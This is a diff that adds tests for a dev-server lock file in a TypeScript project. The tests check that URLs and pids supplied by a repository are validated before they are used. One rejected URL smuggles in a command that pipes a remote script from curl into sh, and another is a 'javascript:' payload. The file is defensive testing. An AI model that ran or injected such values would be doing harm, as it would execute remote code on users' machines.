@@ -4,6 +4,8 @@ import { mkdir, readFile, symlink, writeFile } from "node:fs/promises";
 import { join } from "node:path";
 import { DekError } from "../../src/core/error.ts";
 import {
+  assertNoDevServer,
+  isPidAlive,
   readDevServerLock,
   removeDevServerLock,
   writeDevServerLock,
@@ -81,6 +83,56 @@ describe("writeDevServerLock", () => {
       writeDevServerLock(root, "http://127.0.0.1:1/");
       expect(() => writeDevServerLock(root, "http://127.0.0.1:2/")).toThrow(DekError);
       removeDevServerLock(root);
+    });
+  });
+});
+
+describe("a lock a repository brings along", () => {
+  const lockAt = async (root: string, lock: unknown) => {
+    await mkdir(join(root, ".dek"), { recursive: true });
+    await writeFile(join(root, ".dek", "server.json"), `${JSON.stringify(lock)}\n`);
+  };
+
+  test("is no lock unless it names this machine's dev server as the server writes it", async () => {
+    await withTempDir(async (root) => {
+      for (const url of [
+        "http://127.0.0.1:9/ ; curl -s https://example.com/x | sh ; echo",
+        "https://example.com/",
+        "http://example.com:5173/",
+        "http://127.0.0.1:5173/x",
+        "http://127.0.0.1:5173/?a=b",
+        "http://user@127.0.0.1:5173/",
+        "http://127.0.0.1/",
+        "javascript:alert(1)",
+      ]) {
+        await lockAt(root, { url, pid: process.pid });
+        expect({ url, lock: readDevServerLock(root) }).toEqual({ url, lock: undefined });
+        expect(() => assertNoDevServer(root)).not.toThrow();
+      }
+      for (const url of [
+        "http://127.0.0.1:5173/",
+        "http://localhost:5173/",
+        "http://[::1]:5173/",
+      ]) {
+        await lockAt(root, { url, pid: process.pid });
+        expect(readDevServerLock(root)?.url).toBe(url);
+      }
+    });
+  });
+
+  test("never names a pid that is no process of its own as alive", () => {
+    for (const pid of [0, -1, -process.pid, 1.5, Number.NaN, Number.POSITIVE_INFINITY]) {
+      expect({ pid, alive: isPidAlive(pid) }).toEqual({ pid, alive: false });
+    }
+    expect(isPidAlive(process.pid)).toBe(true);
+  });
+
+  test("with pid 0 or -1 is no running server", async () => {
+    await withTempDir(async (root) => {
+      for (const pid of [0, -1]) {
+        await lockAt(root, { url: "http://127.0.0.1:5173/", pid });
+        expect(() => assertNoDevServer(root)).not.toThrow();
+      }
     });
   });
 });
